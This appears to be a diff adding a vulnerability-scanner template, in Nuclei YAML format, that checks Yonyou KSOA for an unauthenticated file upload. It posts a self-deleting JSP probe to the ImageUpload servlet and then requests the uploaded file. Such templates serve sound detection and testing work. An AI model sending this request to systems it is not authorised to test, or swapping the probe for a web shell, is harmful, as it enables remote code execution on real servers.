@@ -1,0 +1,33 @@
+id: yaml-poc-yonyou-yonyou_ksoa-file_upload-CT-463219
+info:
+  name: Yaml Poc Yonyou Yonyou_Ksoa File_Upload Ct 463219
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-yonyou-yonyou_ksoa-file_upload-CT-463219'
+  tags: fileupload
+  reference:
+  - https://cn-sec.com/archives/1329088.html
+http:
+- method: POST
+  path:
+  - /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename={{rfilename}}.jsp&_ZQA_ID=
+  body: <%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - <root>
+- method: GET
+  path:
+  - /pictures/{{rfilename}}.jsp
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
